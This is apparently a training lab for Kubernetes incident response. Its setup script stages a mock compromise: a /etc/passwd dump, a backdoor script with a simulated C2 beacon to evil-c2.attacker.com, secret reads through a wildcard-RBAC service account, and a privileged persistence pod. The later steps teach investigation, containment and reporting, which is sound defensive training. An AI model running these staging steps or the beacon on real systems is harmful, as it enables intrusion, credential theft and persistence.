# Lab 12: Incident Response Tabletop

**Duration:** 60 minutes

## Objectives

By the end of this lab, you will be able to:

- Investigate a pre-staged compromise scenario in a Kubernetes cluster
- Collect forensic evidence from running pods, audit logs, and cluster state
- Perform containment actions using NetworkPolicies and RBAC modifications
- Document findings and produce an incident report

## Prerequisites

- Cloud9 environment with Docker
- `kubectl` and `kind` installed

## Scenario Overview

> **Alert:** Your monitoring system has detected unusual activity in the `production` namespace. A Falco alert fired for "shell spawned in container" and your audit logs show unexpected secret access. Your task is to investigate, contain, and document the incident.

## Lab Environment Setup

### Step 1: Create the Incident Cluster

```bash
# Create cluster with audit logging
kind create cluster --name ir-lab --config labs/setup/kind-config-audit.yaml

# Wait for the cluster
kubectl wait --for=condition=Ready nodes --all --timeout=120s

# Install jq for JSON parsing
sudo yum install -y jq 2>/dev/null || sudo apt-get install -y jq 2>/dev/null
```

### Step 2: Stage the Compromise Scenario

```bash
# Create the production namespace
kubectl create namespace production

# Deploy the "legitimate" application
kubectl apply -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web-app
  namespace: production
spec:
  replicas: 2
  selector:
    matchLabels:
      app: web-app
  template:
    metadata:
      labels:
        app: web-app
    spec:
      serviceAccountName: web-app-sa
      containers:
        - name: web
          image: nginx:1.25-alpine
          ports:
            - containerPort: 80
---
apiVersion: v1
kind: Service
metadata:
  name: web-app
  namespace: production
spec:
  selector:
    app: web-app
  ports:
    - port: 80
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: web-app-sa
  namespace: production
EOF

# Create secrets that a legitimate app would use
kubectl create secret generic db-credentials -n production \
  --from-literal=host=db.internal.example.com \
  --from-literal=username=app_readonly \
  --from-literal=password='Pr0d-P@ssw0rd-2024!'

kubectl create secret generic api-keys -n production \
  --from-literal=stripe-key='sk_live_fake_key_12345' \
  --from-literal=sendgrid-key='SG.fake_key_67890'

# Create an overly permissive RBAC that the "attacker" exploited
kubectl apply -f - <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: web-app-role
  namespace: production
rules:
  - apiGroups: [""]
    resources: ["*"]
    verbs: ["*"]
  - apiGroups: ["apps"]
    resources: ["*"]
    verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: web-app-binding
  namespace: production
subjects:
  - kind: ServiceAccount
    name: web-app-sa
    namespace: production
roleRef:
  kind: Role
  name: web-app-role
  apiGroup: rbac.authorization.k8s.io
EOF

# Wait for pods to be ready
kubectl wait --for=condition=Ready pods --all -n production --timeout=120s

# Simulate the attack: attacker gets a shell and performs malicious actions
ATTACK_POD=$(kubectl get pod -n production -l app=web-app -o jsonpath='{.items[0].metadata.name}')

# Stage evidence of attack
kubectl exec -n production $ATTACK_POD -- sh -c '
  # Attacker reads /etc/passwd
  cat /etc/passwd > /tmp/.passwd_dump

  # Attacker creates a reverse shell script
  cat > /tmp/.backdoor.sh << "SHELL"
#!/bin/sh
while true; do
  sleep 300
  # simulated C2 callback
  wget -q -O /dev/null http://evil-c2.attacker.com/beacon 2>/dev/null || true
done
SHELL
  chmod +x /tmp/.backdoor.sh

  # Attacker leaves traces
  echo "$(date) - accessed via kubectl exec" >> /tmp/.access_log
  mkdir -p /tmp/.tools
  echo "# crypto miner config" > /tmp/.tools/config.json
'

# Simulate secret access via the service account
kubectl get secrets -n production -o yaml > /dev/null 2>&1
kubectl get secret db-credentials -n production -o jsonpath='{.data.password}' > /dev/null 2>&1
kubectl get secret api-keys -n production -o jsonpath='{.data.stripe-key}' > /dev/null 2>&1

# Deploy a suspicious pod (attacker's persistence mechanism)
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: debug-tools
  namespace: production
  labels:
    app: web-app
    purpose: debug
spec:
  serviceAccountName: web-app-sa
  containers:
    - name: tools
      image: ubuntu:22.04
      command: ["sleep", "infinity"]
      securityContext:
        privileged: true
EOF

kubectl wait --for=condition=Ready pod/debug-tools -n production --timeout=60s

echo ""
echo "============================================"
echo "  INCIDENT SCENARIO STAGED"
echo "============================================"
echo ""
echo "You have received the following alert:"
echo ""
echo "  [CRITICAL] Falco Alert: Shell spawned in container"
echo "  Namespace: production"
echo "  Pod: $ATTACK_POD"
echo "  Time: $(date)"
echo ""
echo "  [WARNING] Audit Alert: Unusual secret access pattern"
echo "  User: system:serviceaccount:production:web-app-sa"
echo "  Resources: db-credentials, api-keys"
echo ""
echo "Begin your investigation below."
echo "============================================"
```

## Phase 1: Detection & Triage (10 minutes)

### Step 3: Initial Assessment

```bash
echo "=== PHASE 1: Detection & Triage ==="
echo ""

# What pods are running in the namespace?
echo "--- Running Pods ---"
kubectl get pods -n production -o wide

# Any suspicious pods?
echo ""
echo "--- Pod Details ---"
kubectl get pods -n production -o jsonpath='{range .items[*]}Pod: {.metadata.name}  Image: {.spec.containers[0].image}  SA: {.spec.serviceAccountName}  Privileged: {.spec.containers[0].securityContext.privileged}{"\n"}{end}'
```

**Questions to answer:**
1. How many pods are running? Are any unexpected?
2. Are any pods running in privileged mode?
3. What service accounts are in use?

### Step 4: Check for Suspicious Activity

```bash
# Look for the suspicious pod
echo "--- Suspicious Pod Analysis ---"
kubectl describe pod debug-tools -n production | grep -E "Image:|Privileged:|Service Account:|Started:"

# Check when the pod was created
echo ""
echo "--- Pod Creation Times ---"
kubectl get pods -n production -o jsonpath='{range .items[*]}{.metadata.name}: {.metadata.creationTimestamp}{"\n"}{end}'
```

### Step 5: Review Audit Logs

```bash
echo "--- Recent Secret Access in Audit Logs ---"
docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
  jq -r 'select(.objectRef.resource == "secrets" and .objectRef.namespace == "production") |
    "  \(.requestReceivedTimestamp // "") | \(.verb | . + " " * (6 - length)) | \(.user.username | . + " " * ([50 - length, 0] | max)) | \(.objectRef.name // "")"' | tail -20
```

## Phase 2: Investigation (15 minutes)

### Step 6: Investigate the Compromised Pod

```bash
ATTACK_POD=$(kubectl get pod -n production -l app=web-app -o jsonpath='{.items[0].metadata.name}')

echo "=== PHASE 2: Investigation ==="
echo ""
echo "--- Investigating pod: $ATTACK_POD ---"

# Check for suspicious files
echo ""
echo "--- Hidden files in /tmp ---"
kubectl exec -n production $ATTACK_POD -- ls -la /tmp/

# Read the backdoor script
echo ""
echo "--- Backdoor script content ---"
kubectl exec -n production $ATTACK_POD -- cat /tmp/.backdoor.sh 2>/dev/null || echo "No backdoor found"

# Check the access log
echo ""
echo "--- Access log ---"
kubectl exec -n production $ATTACK_POD -- cat /tmp/.access_log 2>/dev/null || echo "No access log found"

# Check the tools directory
echo ""
echo "--- Attacker tools ---"
kubectl exec -n production $ATTACK_POD -- ls -la /tmp/.tools/ 2>/dev/null || echo "No tools directory found"
kubectl exec -n production $ATTACK_POD -- cat /tmp/.tools/config.json 2>/dev/null || echo "No config found"
```

### Step 7: Investigate RBAC Permissions

```bash
echo "--- RBAC Analysis ---"

# Check the web-app-sa permissions
echo "Service Account Permissions:"
kubectl auth can-i --list -n production --as system:serviceaccount:production:web-app-sa | head -20

echo ""
echo "Can access secrets?"
kubectl auth can-i get secrets -n production --as system:serviceaccount:production:web-app-sa

echo ""
echo "Can create pods?"
kubectl auth can-i create pods -n production --as system:serviceaccount:production:web-app-sa

echo ""
echo "Can modify RBAC?"
kubectl auth can-i create rolebindings -n production --as system:serviceaccount:production:web-app-sa

# View the actual role
echo ""
echo "--- Role definition ---"
kubectl get role web-app-role -n production -o yaml | grep -A 20 "rules:"
```

### Step 8: Check for Lateral Movement

```bash
echo "--- Lateral Movement Check ---"

# Check if the SA has cluster-level access
kubectl auth can-i get pods --all-namespaces --as system:serviceaccount:production:web-app-sa
kubectl auth can-i get secrets --all-namespaces --as system:serviceaccount:production:web-app-sa

# Check for any ClusterRoleBindings referencing the SA
kubectl get clusterrolebindings -o json | \
  jq -r '.items[] | select(.subjects[]? | .name == "web-app-sa" and .namespace == "production") |
    "  ClusterRoleBinding: \(.metadata.name) -> \(.roleRef.name)"' || echo "  No cluster-level bindings found"

# Check for pods running in other namespaces
echo ""
echo "--- Pods in all namespaces (check for attacker persistence) ---"
kubectl get pods --all-namespaces -l purpose=debug 2>/dev/null || echo "  No debug pods found in other namespaces"
```

## Phase 3: Containment (10 minutes)

### Step 9: Network Isolation

```bash
echo "=== PHASE 3: Containment ==="
echo ""

# Apply immediate network isolation
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: emergency-isolate
  namespace: production
spec:
  podSelector: {}
  policyTypes:
    - Ingress
    - Egress
  # Block all traffic — emergency containment
EOF

echo "Network isolation applied — all ingress and egress blocked"
```

### Step 10: Quarantine the Compromised Pod

```bash
# Add quarantine label and remove from service
kubectl label pod $ATTACK_POD -n production quarantine=true
kubectl label pod $ATTACK_POD -n production app-   # Remove the app label so service stops routing

# Remove the malicious debug pod
echo ""
echo "Removing attacker's debug pod..."
kubectl delete pod debug-tools -n production --grace-period=0 --force

echo "Compromised pod quarantined, malicious pod removed"
```

### Step 11: Lock Down RBAC

```bash
# Replace the overly permissive role with a restricted one
kubectl apply -f - <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: web-app-role
  namespace: production
rules:
  - apiGroups: [""]
    resources: ["configmaps"]
    verbs: ["get"]
EOF

echo "RBAC locked down — service account now has minimal permissions"

# Verify the lockdown
kubectl auth can-i get secrets -n production --as system:serviceaccount:production:web-app-sa
# Expected: no
```

## Phase 4: Evidence Collection (10 minutes)

### Step 12: Capture Forensic Evidence

```bash
echo "=== PHASE 4: Evidence Collection ==="
echo ""

# Create evidence directory
mkdir -p /tmp/incident-evidence

# Capture pod state
kubectl get pod $ATTACK_POD -n production -o yaml > /tmp/incident-evidence/compromised-pod.yaml
echo "Saved: compromised-pod.yaml"

# Capture pod logs
kubectl logs $ATTACK_POD -n production > /tmp/incident-evidence/pod-logs.txt 2>&1
echo "Saved: pod-logs.txt"

# Capture filesystem evidence
kubectl exec -n production $ATTACK_POD -- tar czf - /tmp/ 2>/dev/null > /tmp/incident-evidence/tmp-contents.tar.gz
echo "Saved: tmp-contents.tar.gz"

# Capture RBAC state
kubectl get role,rolebinding -n production -o yaml > /tmp/incident-evidence/rbac-state.yaml
echo "Saved: rbac-state.yaml"

# Capture audit logs
docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log > /tmp/incident-evidence/audit-log.json 2>/dev/null
echo "Saved: audit-log.json"

# Capture network policies
kubectl get networkpolicies -n production -o yaml > /tmp/incident-evidence/netpol-state.yaml
echo "Saved: netpol-state.yaml"

# Capture all events
kubectl get events -n production --sort-by='.lastTimestamp' > /tmp/incident-evidence/events.txt
echo "Saved: events.txt"

echo ""
echo "All evidence collected in /tmp/incident-evidence/"
ls -la /tmp/incident-evidence/
```

### Step 13: Timeline Reconstruction

```bash
echo "=== Incident Timeline ==="
echo ""

# Build timeline from audit logs
cat /tmp/incident-evidence/audit-log.json | \
  jq -r 'select(.objectRef.namespace == "production" and (.verb == "create" or .verb == "delete" or .verb == "get" or .verb == "update" or .verb == "patch")) |
    "\(.requestReceivedTimestamp // "")\t\(.verb)\t\(.user.username)\t\((.objectRef.resource // "") + "/" + (.objectRef.name // "") | rtrimstr("/"))"' | \
  sort | tail -30 | \
  awk -F'\t' '{printf "  %-30s | %-8s | %-40s | %s\n", $1, $2, substr($3,1,40), $4}' \
  2>/dev/null || echo "  Unable to parse audit logs"
```

## Phase 5: Documentation (15 minutes)

### Step 14: Create the Incident Report

```bash
cat > /tmp/incident-evidence/incident-report.md <<'REPORT'
# Incident Report

## Incident Summary
- **Incident ID:** IR-2024-001
- **Severity:** Critical
- **Status:** Contained
- **Detection Time:** [timestamp of first alert]
- **Containment Time:** [timestamp of containment actions]

## What Happened
An attacker gained shell access to a production web application container.
Using the overly permissive service account role, the attacker:
1. Accessed production secrets (database credentials, API keys)
2. Deployed a privileged "debug" pod for persistence
3. Created a backdoor script for C2 communication
4. Staged crypto mining tools

## Root Cause
The `web-app-role` Role granted wildcard permissions (`*` on all resources/verbs)
to the web application service account. This violated the principle of least
privilege and allowed the attacker to access secrets and create pods.

## Impact
- **Credentials Exposed:** db-credentials, api-keys
- **Data at Risk:** Database access via exposed credentials
- **Persistence:** Privileged debug pod and backdoor script

## Containment Actions Taken
1. Applied emergency NetworkPolicy to block all traffic
2. Quarantined compromised pod (removed from service)
3. Deleted attacker's debug pod
4. Replaced wildcard RBAC with minimal permissions

## Evidence Collected
- Pod YAML manifest
- Container filesystem artifacts (/tmp/ contents)
- Audit logs
- RBAC configuration
- Network policy state
- Kubernetes events

## Remediation Recommendations
1. **Immediate:** Rotate all exposed credentials (db-credentials, api-keys)
2. **Immediate:** Review and restrict all service account permissions
3. **Short-term:** Implement Pod Security Standards (Restricted)
4. **Short-term:** Deploy Falco for runtime detection
5. **Medium-term:** Implement NetworkPolicies for all namespaces
6. **Medium-term:** Enable and monitor audit logging
7. **Long-term:** Implement admission controllers to prevent privileged pods

## Lessons Learned
- Wildcard RBAC permissions are extremely dangerous
- Privileged pods should never be allowed in production
- Runtime security monitoring (Falco) could have detected this sooner
- Network policies would have limited lateral movement
REPORT

echo "Incident report created at /tmp/incident-evidence/incident-report.md"
cat /tmp/incident-evidence/incident-report.md
```

## Cleanup

```bash
# Delete the production namespace
kubectl delete namespace production

# Clean up evidence
rm -rf /tmp/incident-evidence

# (Optional) Delete the cluster
kind delete cluster --name ir-lab
```

## Summary

In this lab, you:
- Investigated a pre-staged compromise scenario with realistic attack artifacts
- Collected forensic evidence from containers, audit logs, and cluster state
- Performed containment using NetworkPolicies, pod quarantine, and RBAC lockdown
- Reconstructed an incident timeline from audit logs
- Created a comprehensive incident report with root cause and remediation recommendations

Key takeaway: Incident response in Kubernetes requires familiarity with kubectl forensics, audit logs, and rapid containment techniques. Regular tabletop exercises build the muscle memory needed when real incidents occur.
